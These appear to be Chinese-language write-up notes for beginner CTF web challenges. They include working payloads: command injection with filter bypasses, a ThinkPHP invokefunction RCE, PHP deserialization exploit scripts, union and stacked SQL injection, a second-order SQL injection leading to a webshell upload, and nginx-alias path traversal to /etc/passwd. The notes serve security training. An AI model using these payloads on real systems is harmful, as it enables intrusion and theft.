# CTF-web-引导

## view_source

js关闭

\------

## robots

查看robots.txt文件即可

\------

## backup

.git .bak .back .swp .phps .svn .bash_history .......

访问index.php.bak

\--------

## cookie

burp抓包，拦截看到cookie
访问cookie.php 看到response

\--------

## disabled_button

审查元素删除disabled

\--------

## get_post

正常提交

\---------

## weak_auth

admin 123456

\---------

## simple_php

<?php
show_source(__FILE__);
include("config.php");
$a=@$_GET['a'];
$b=@$_GET['b'];
if($a==0 and $a){
  echo $flag1;
}
if(is_numeric($b)){
  exit();
}
if($b>1234){
  echo $flag2;
}
?> 

php是弱类型语言
0=='x'
1234=='1234x'

/?a=x&b=1239x

\--------

## command_execution

ping发现是一个linux系统

127.0.0.1 & find / -name flag.txt
127.0.0.1 & cat /home/flag.txt

\---------

## xff_referer

X-Forwarded-For: ![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\%W@GJ$ACOF(TYDYECOKVDYB.png)123.123.123.123
Referer: ![img](file:///C:\Users\28633\AppData\Roaming\Tencent\QQTempSys\[5UQ[BL(6~BS2JV6W}N6[%S.png)https://www.google.com

\----------

## simple_js

\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30

转化为数字
数字以ascii转为英文

\---------

## baby_web

发现index.php通过302重定向1.php

抓包，查看index.php的302 response头部

\----------

## Training-WWW-Robots

查看robots.txt

\---------

## ics-06

爆破id=2333会出现flag

\---------

## PHP2

搜集目标网站的目录信息
python dirsearch -u [目标网站] -e php

如果没有目录信息

/index.phps 发现残留的文件

<?php
if("admin"===$_GET[id]) {
 echo("<p>not allowed!</p>");
 exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
 echo "<p>Access granted!</p>";
 echo "<p>Key: xxxxxxx </p>";
}
?>

把admin进行2次编码，因为get接收到之后会解码一次
/index.php?id=%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65

## php_rce

```php
index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1

index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls

/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find / -name "*flag*"

/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag
```

```php
<?php 

class Demo { 

  private $file = 'index.php';
  //构造函数，传入文件
  public function __construct($file) { 
    $this->file = $file; 
  }
  //析构函数
  function __destruct() { 
    //输出$file代表的文件
    echo @highlight_file($this->file, true); 
  }
  //反序列化的时候执行
  function __wakeup() { 
    if ($this->file != 'index.php') { 
      //the secret is in the fl4g.php
      $this->file = 'index.php'; 
    } 
  } 
}

//如果get进来var
/*
if (isset($_GET['var'])) { 
  //进行base64解密
  $var = base64_decode($_GET['var']); 
  //正则匹配
  if (preg_match('/[oc]:\d+:/i', $var)) { 
    die('stop hacking!'); 
  } else {
    @unserialize($var); 
  } 
} else { 
  highlight_file("index.php"); 
} 
*/

//此时$file='fl4g.php';
$a = new Demo('fl4g.php');
$b = serialize($a);
echo $b."<br/>";
$c = str_replace('O:4','O:+4',$b);
$d = str_replace(':1:',':2:',$c);
echo $d."<br/>";
$e = base64_encode($d);
echo $e;

?>
```

## fakebook

```php
/view.php?no=1 order by 4 --+ 可以

碰到防火墙

/view.php?no=-1 union/**/select 1,2,3,4 --+

暴露了真实路径
/var/www/html/view.php

2号位
database()
fakebook

/view.php?no=0 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook' --+
发现users

/view.php?no=0 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users' --+
发现
no,username,passwd,data

/view.php?no=0 union/**/select 1,group_concat(data),3,4 from users --+
发现data的数据
O:8:"UserInfo":3:{s:4:"name";s:2:"zj";s:3:"age";i:20;s:4:"blog";s:13:"www.baidu.com";}
我们数据进去之后会进行序列化，保存在data字段


/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:2:"zj";s:3:"age";i:20;s:4:"blog";s:13:"www.baidu.com";}' --+
发现只有4号位会进行反序列化操作

可以考虑使用file:///进行请求本地文件

$a = new UserInfo();
$a->name = 'zj';
$a->age = 20;
$a->blog= "file:///var/www/html/flag.php";
echo serialize($a);

O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}
修改序列化内容
结果放在4号位，可以读取文件
```



```sql
1 and 0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:123;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' from users#
构造序列化后传参
```



```sql
0 union/**/select 1,load_file("/var/www/html/flag.php"),3,4#  
2号位有回显
```

## lottery

```php
<?php
require_once('config.php');
header('Content-Type: application/json');

function response($resp){
	die(json_encode($resp));
}

function response_error($msg){
	$result = ['status'=>'error'];
	$result['msg'] = $msg;
	response($result);
}

//{ action:"buy",numbers:"1234567"  }
//寻找json数据里是否有action字段，没有就报错停掉程序
function require_keys($req, $keys){
	foreach ($keys as $key) {
		if(!array_key_exists($key, $req)){
			response_error('invalid request');
		}
	}
}

//要求用户是登录才进来的
function require_registered(){
	if(!isset($_SESSION['name']) || !isset($_SESSION['money'])){
		response_error('register first');
	}
}

//要求用户口袋里至少多少钱
function require_min_money($min_money){
	if(!isset($_SESSION['money'])){
		response_error('register first');
	}
	$money = $_SESSION['money'];
	if($money < 0){
		$_SESSION = array();
		session_destroy();
		response_error('invalid negative money');
	}
	if($money < $min_money){
		response_error('you don\' have enough money');
	}
}

//{ action:"buy",numbers:"1234567"  }
//程序从这里开始执行
//必须要POST，必须要有content-type，content-type必须是application/json
if($_SERVER["REQUEST_METHOD"] != 'POST' || !isset($_SERVER["CONTENT_TYPE"]) || $_SERVER["CONTENT_TYPE"] != 'application/json'){
	response_error('please post json data');
}

//php接收post的数据，并且使用json_decode对json数据进行解码
$data = json_decode(file_get_contents('php://input'), true);
if(json_last_error() != JSON_ERROR_NONE){
	response_error('invalid json');
}

//{ action:"buy",numbers:"1234567"  }
require_keys($data, ['action']);

// my boss told me to use cryptographically secure algorithm 
function random_num(){
	do {
		$byte = openssl_random_pseudo_bytes(10, $cstrong);
		$num = ord($byte);
	} while ($num >= 250);

	if(!$cstrong){
		response_error('server need be checked, tell admin');
	}
	
	$num /= 25;
	return strval(floor($num));
}

//生成7位随机数
function random_win_nums(){
	$result = '';
	for($i=0; $i<7; $i++){
		$result .= random_num();
	}
	return $result;
}


function buy($req){
	//要求用户登录
	require_registered();
	//要求用户至少有2块钱
	require_min_money(2);
	//读取用户现在口袋里所有金额
	$money = $_SESSION['money'];
	//获得你下注的数字
	$numbers = $req['numbers'];
	//生成7位随机数
	$win_numbers = random_win_nums();
	//定义一个计算你的下注胡子和随机数相同的数字个数
	$same_count = 0;
	//把下注数字和答案进行逐个比较
	for($i=0; $i<7; $i++){
		//如果一致，那么就增加相同的个数
		if($numbers[$i] == $win_numbers[$i]){
			$same_count++;
		}
	}
	switch ($same_count) {
		case 2:
			$prize = 5;
			break;
		case 3:
			$prize = 20;
			break;
		case 4:
			$prize = 300;
			break;
		case 5:
			$prize = 1800;
			break;
		case 6:
			$prize = 200000;
			break;
		case 7:
			$prize = 5000000;
			break;
		default:
			$prize = 0;
			break;
	}
	//口袋里的钱-2，加上你赢得的钱
	$money += $prize - 2;
	//放到你的session中
	$_SESSION['money'] = $money;
	//返回到前端
	response(['status'=>'ok','numbers'=>$numbers, 'win_numbers'=>$win_numbers, 'money'=>$money, 'prize'=>$prize]);
}

function flag($req){
	global $flag;
	global $flag_price;

	require_registered();
	$money = $_SESSION['money'];
	if($money < $flag_price){
		response_error('you don\' have enough money');
	} else {
		$money -= $flag_price;
		$_SESSION['money'] = $money;
		$msg = 'Here is your flag: ' . $flag;
		response(['status'=>'ok','msg'=>$msg, 'money'=>$money]);
	}
}

function register($req){
	$name = $req['name'];
	$_SESSION['name'] = $name;
	$_SESSION['money'] = 20;

	response(['status'=>'ok']);
}


//查找action里面是什么动作
//'{"action":"buy","numbers":"1234567"}';
switch ($data['action']) {
	case 'buy':
		require_keys($data, ['numbers']);
		buy($data);
		break;

	case 'flag':
		flag($data);
		break;

	case 'register':
		require_keys($data, ['name']);
		register($data);
		break;
	
	default:
		response_error('invalid request');
		break;
}
```

burp抓包把"number"改为[true*7]

## supersqli

return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
把关键词的大小写都匹配了

可以考虑堆叠注入

```sql
/?inject=1';show databases; --+
```

发现
supersqli
ctftraining

因为自己已经在某个库里了

```php
/?inject=1';show tables; --+
```

1919810931114514
words

查看表中的列

```php
/?inject=1';show columns from `1919810931114514`; --+
```

发现flag

```php
/?inject=1';show columns from `words`; --+
```

id data

说明当前默认数据库查询查询的是words这张表

把words表名改为haha

```sql
rename tables `words` to `haha`;
rename tables `1919810931114514` to `words\`;
alter table `words` change `flag` `id` varchar(100);

rename tables `words` to `haha`;rename tables `1919810931114514` to `words`;alter table `words` change `flagid` varchar(100);
```



最后输入一个绝对正确的答案

```sql
/?inject=1' or 1 --+
```

## unseping

```php
<?php
highlight_file(__FILE__);//显示源代码

class ease{

  private $method;	//私有变量
  private $args;

  function __construct($method, $args) {	//创建对象时自动调用
    $this->method = $method;	//给私有变量赋值
    $this->args = $args;
  }
  //析构函数使用ping命令去执行
  function __destruct(){	//对象销毁时自动调用
    if (in_array($this->method, array("ping"))) {	//判断method变量是否等于"ping"
      call_user_func_array(array($this, $this->method), $this->args);	//用一个数组调用一个回调函数,返回值为回调函数执行的结果或者为flase
    }
  } 

  //ping命令的来源
  function ping($ip){
    exec($ip, $result);	//执行系统命令
    var_dump($result);
  }

  //防火墙
  function waf($str){
    //| & ; / cat flag tac php ls 空格
    if (!preg_match_all("/(\||&|;| |\/|cat|flag|tac|php|ls)/", $str, $pat_array)) {
      return $str;
    } else {
      echo "don't hack";
    }
  }

  //当执行反序列化的时候
  function __wakeup(){
    //反序列化的时候都会把参数拿来过一遍防火墙
    foreach($this->args as $k => $v) { //遍历数组
      $this->args[$k] = $this->waf($v);//调用waf过滤
    }
  }  
}

$ctf=@$_POST['ctf'];
@unserialize(base64_decode($ctf));//进行base64解码
?>
```

```php
在自己的环境里
<?php

class ease{

  private $method;
  private $args;

  function __construct($method, $args) {
    $this->method = $method;
    $this->args = $args;
  }

}

$a = new ease('ping',array('l""s${IFS}-l'));
$b = serialize($a);
echo base64_encode($b);

?>

可以看到flag_1s_here

$a = new ease('ping',array('l""s${IFS}f""lag_1s_here'));

可以看到
flag_831b69012c67b35f.php

正/被屏蔽了
可以把8进制的东西转为ascii字符串，八进制的/是\57
https://photo333.com/text-to-octal-zh.php
$(printf${IFS}"\57")  => /

$a = new ease('ping',array('c""at${IFS}f""lag_1s_here$(printf${IFS}"\57")f""lag_831b69012c67b35f.p""hp'));
```

## filemanager

```php
filemanager

扫描器扫描
/www.tar.gz备份文件


haha.jpg

fid filename    oldname view extension
1     haha        null   0     .jpg
2  ',extension='               .jpg
3     upload                   .jpg


rename
1     nihao    haha   0     .jpg
2   upload.jpg  null         null
3     upload                .jpg

1     nihao    haha   0     .jpg
2   upload.php  null         null
3     upload                .jpg


-----------------
upload文件夹中

',extension='.jpg
upload.jpg--->upload.jpg(一句话木马版本)

upload.jpg+null

upload.php+null

小知识：
$a = "/upload/haha.jpg";
echo basename($a);
返回haha.jpg说明是返回路径中的文件名

漏洞出现在文件名修改

update `file` set `filename`='upload.jpg', `oldname`='  ',extension='    ' where `fid`=1

此时sql注入的代码是我们上传进去的文件名！！！！

首先，创建一个 
名字为   ',extension='.jpg
假的图片文件上传
/upload/',extension='.jpg

之后改名  ',extension=' 改名为upload.jpg

之后制作一个一句话木马为upload.jpg

之后改名 upload.jpg 改名为 upload.php
```

rename审计

```PHP
<?php
/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: 下午9:39
 */

require_once "common.inc.php";
//接收post两个数据 oldname newname
if (isset($req['oldname']) && isset($req['newname'])) {
	//使用oldname进行查询
	$result = $db->query("select * from `file` where `filename`='{$req['oldname']}'");
	if ($result->num_rows > 0) {
		//找到了取出
		//mysql_fetch_assoc() 函数从结果集中取得一行作为关联数组。
		//返回根据从结果集取得的行生成的关联数组，如果没有更多行，则返回 false。
		$result = $result->fetch_assoc();
	} else {
		exit("old file doesn't exists!");
	}

	if ($result) {

		$req['newname'] = basename($req['newname']);
		//漏洞出现的地方 update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}
		//update `file` set `filename`='x', `oldname`='x' where `fid`=1
		//update `file` set `filename`='x', `oldname`=' ',extension='' where `fid`=1
		//此时sql注入的代码是我们上传进去的文件名
		$re = $db->query("update `file` set `filename`='{$req['newname']}', `oldname`='{$result['filename']}' where `fid`={$result['fid']}");
		if (!$re) {
			print_r($db->error);
			exit;
		}
		//			 upload/			haha			.jpg
		$oldname = UPLOAD_DIR . $result["filename"] . $result["extension"];
		$newname = UPLOAD_DIR . $req["newname"] . $result["extension"];
		if (file_exists($oldname)) {
			rename($oldname, $newname);
		}
		$url = "/" . $newname;
		echo "Your file is rename, url:
                <a href=\"{$url}\" target='_blank'>{$url}</a><br/>
                <a href=\"/\">go back</a>";
	}
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>file manage</title>
    <base href="/">
    <meta charset="utf-8" />
</head>
<h3>Rename</h3>
<body>
<form method="post">
    <p>
        <span>old filename(exclude extension)：</span>
        <input type="text" name="oldname">
    </p>
    <p>
        <span>new filename(exclude extension)：</span>
        <input type="text" name="newname">
    </p>
    <p>
        <input type="submit" value="rename">
    </p>
</form>
</body>
</html>

```

upload代码审计

```php
<?php
/**
 * Created by PhpStorm.
 * User: phithon
 * Date: 15/10/14
 * Time: 下午8:45
 */

require_once "common.inc.php";

if ($_FILES) {
	//如果你上传了
	$file = $_FILES["upfile"];
	if ($file["error"] == UPLOAD_ERR_OK) {
		$name = basename($file["name"]);
		//basename() 函数返回路径中的文件名部分。
		//upload/haha.jpg 会返回haha.jpg
		$path_parts = pathinfo($name);
		//pathinfo() 函数以数组的形式返回文件路径的信息。
		/*<?php	print_r(pathinfo("/testweb/test.txt"));	?>*/
		// Array
		// (
		// [dirname] => /testweb
		// [basename] => test.txt
		// [extension] => txt
		// )
		if (!in_array($path_parts["extension"], array("gif", "jpg", "png", "zip", "txt"))) {
			exit("error extension");
		}
		//组合一个后缀名path_parts["extension"]=".jpg"
		//extension不带点的后缀名
		$path_parts["extension"] = "." . $path_parts["extension"];
		//组合文件名
		$name = $path_parts["filename"] . $path_parts["extension"];

		// $path_parts["filename"] = $db->quote($path_parts["filename"]);
		// Fix
		//过滤，addslashes在每个双引号（"）前添加反斜杠：
		$path_parts['filename'] = addslashes($path_parts['filename']);
		//文件名和后缀分开存储
		$sql = "select * from `file` where `filename`='{$path_parts['filename']}' and `extension`='{$path_parts['extension']}'";

		$fetch = $db->query($sql);

		if ($fetch->num_rows > 0) {
			exit("file is exists");
		}

		if (move_uploaded_file($file["tmp_name"], UPLOAD_DIR . $name)) {
			//把文件写入数据库
			$sql = "insert into `file` ( `filename`, `view`, `extension`) values( '{$path_parts['filename']}', 0, '{$path_parts['extension']}')";
			$re = $db->query($sql);
			if (!$re) {
				print_r($db->error);
				exit;
			}
			$url = "/" . UPLOAD_DIR . $name;
			echo "Your file is upload, url:
                <a href=\"{$url}\" target='_blank'>{$url}</a><br/>
                <a href=\"/\">go back</a>";
		} else {
			exit("upload error");
		}

	} else {
		print_r(error_get_last());
		exit;
	}
}
```



<img src="C:\Users\28633\AppData\Roaming\Typora\typora-user-images\image-20230111224012158.png" alt="image-20230111224012158" style="zoom:150%;" />

## Web_php_wrong_nginx_config

```php
通过扫描
/admin.php
请登录

/admin/admin.php
请登录

/admin/index.php
出现please continue

/login.php
请登录

robots.txt

访问robots.txt
hint.php
提示配置文件有问题
/etc/nginx/sites-enabled/site.conf

Hack.php
让我们登录
burp抓包，发现isLogin=0改为1可以进入后台
修改火狐的cookie，让isLogin=1永久登录
可以点击管理中心--->/admin/admin.php

/admin/admin.php?file=index&ext=php
页面出现please continue，估测是文件包含，file代表文件名，ext代表后缀名

/admin/admin.php?file=../../../../../../../../etc/passwd&ext=
不理我

/admin/admin.php?file=index../../&ext=php
出现please continue，估算程序员替换../

/admin/admin.php?file=....//..././....//..././....//....//..././etc/passwd&ext=
出现系统的用户信息

/admin/admin.php?file=....//..././....//..././....//....//..././/etc/nginx/sites-enabled/site.conf&ext=
查看它nginx配置文件
进行代码格式化

不正常配置
location /web-img {
  alias /images/; 
  autoindex on; #允许目录浏览（危险）
}

alias意思是别名
让用户输入/web-img 实际上访问的是/images/

访问
/web-img../ 就可以看到linux系统的根目录
/web-img../var/www/ 发现hack.php.bak，推测出黑客真实的文件hack.php
下载这个bak文件
发现是一个加密的一句话木马
输出最后的$f
进行php代码格式化
使用大佬写的python连接器，修改
url = 'http://目标网站:58794/hack.php'
python2 xx.py
system("ls");
```

